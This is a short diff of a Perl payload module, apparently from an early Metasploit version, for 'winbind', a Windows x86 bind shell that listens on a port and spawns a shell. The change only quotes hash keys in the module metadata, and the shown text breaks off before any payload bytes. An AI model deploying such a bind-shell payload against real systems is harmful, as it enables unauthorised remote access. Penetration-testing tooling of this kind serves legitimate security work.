@@ -5,23 +5,23 @@ use Pex::Utils;
 
 my $info =
 {
-    Name         => 'winbind',
-    Version      => '1.0',
-    Description  => 'Listen for connection and spawn a shell',
-    Author       => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
-    Arch         => [ 'x86' ],
-    Priv         => 0,
-    OS           => [ 'win32' ],
-    Multistage   => 0,
-    Type         => 'bind_shell',
-    Size         => '',
-    UserOpts     =>
+    'Name'         => 'winbind',
+    'Version'      => '1.0',
+    'Description'  => 'Listen for connection and spawn a shell',
+    'Author'       => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
+    'Arch'         => [ 'x86' ],
+    'Priv'         => 0,
+    'OS'           => [ 'win32' ],
+    'Multistage'   => 0,
+    'Type'         => 'bind_shell',
+    'Size'         => '',
+    'UserOpts'     =>
         {
             'LPORT' => [1, 'PORT', 'Listening port for bind shell'],
         },
         
     # win32 specific code
-    Win32Payload =>
+    'Win32Payload' =>
     {
         Offsets => { 'LPORT' => [161, 'n'], 'EXITFUNC' => [37, 'L'] },
         Payload => 
